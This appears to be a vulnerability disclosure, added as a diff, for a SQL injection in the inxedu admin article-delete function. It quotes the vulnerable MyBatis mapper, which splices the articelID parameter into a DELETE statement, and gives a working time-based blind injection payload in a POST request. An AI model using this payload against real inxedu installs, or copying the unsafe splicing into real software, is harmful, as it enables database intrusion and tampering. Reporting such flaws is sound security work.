@@ -1,0 +1,25 @@
+# By Li Zaitang
+
+SQL Injection：
+    
+    In the background article delete page, the incoming articelID can be controlled, and is stitched by $, directly stitched to MySQL.
+
+'''
+
+
+Source:
+      /src/main/resources/mybatis/inxedu/article/ArticleMapper.xml:95-98
+
+	<delete id="deleteArticleByIds" parameterType="java.lang.String">
+		DELETE FROM EDU_ARTICLE WHERE EDU_ARTICLE.ARTICLE_ID IN (${value})
+	</delete>
+
+	Affected software:inxedu <= 2.0.6
+	Software Link: http://175.6.244.211:88/uploads/userup/2457/inxeduopen-inxedu-master.zip
+
+'''
+
+exploit:
+http://127.0.0.1:7788/admin/article/delete
+POST 
+articelID=17') and if(1,sleep(5),1)#
